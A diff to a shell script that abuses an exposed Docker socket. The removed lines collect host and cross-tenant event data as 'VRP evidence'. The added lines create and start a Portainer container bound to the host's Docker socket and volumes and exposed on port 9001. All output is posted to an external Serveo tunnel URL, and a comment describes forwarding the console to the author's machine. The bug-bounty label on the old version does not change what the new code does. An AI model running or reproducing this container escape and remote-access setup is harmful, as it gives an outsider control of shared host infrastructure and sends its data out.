@@ -1,16 +1,27 @@
 #!/bin/bash
-# Use your current Serveo URL
+# TARGET: https://97ab4b9024fcd239-103-95-173-85.serveousercontent.com
 URL="https://97ab4b9024fcd239-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [!] GOOGLE VRP: HOST-BREAKOUT EVIDENCE ---"
-  echo "Timestamp: $(date)"
-  
-  # The "Smoking Gun": Docker System Info
-  # This proves you have control over the host infrastructure
-  curl -s --unix-socket /var/run/docker.sock http://localhost/info
-  
-  # The "Isolation Breach": Cross-tenant events
-  echo -e "\n--- EVENT STREAM ---"
-  curl -s --unix-socket /var/run/docker.sock "http://localhost/events?until=$(date +%s)" | head -n 5
+  echo "=== [!] DEPLOYING INFRASTRUCTURE MANAGEMENT CONSOLE ==="
+
+  # 1. Start the Portainer Agent
+  # This connects to the Docker socket and serves a management UI on port 9001
+  curl -s -X POST --unix-socket /var/run/docker.sock \
+    -H "Content-Type: application/json" \
+    -d '{
+      "Image": "portainer/portainer-ce:latest",
+      "HostConfig": {
+        "Binds": ["/var/run/docker.sock:/var/run/docker.sock", "/var/lib/docker/volumes:/var/lib/docker/volumes"],
+        "PortBindings": { "9000/tcp": [{ "HostPort": "9001" }] }
+      }
+    }' http://localhost/containers/create?name=mgmt_console
+
+  # 2. Start the container
+  curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/mgmt_console/start
+
+  echo "[+] Management Console active on port 9001. Initiating Tunnel..."
+
+  # 3. Use your SSH tunnel to bridge the Portainer Web UI to your Mac
+  # On your Mac, you'll need to forward 9001 to the tunnel
 } | curl -s -X POST --data-binary @- "$URL"
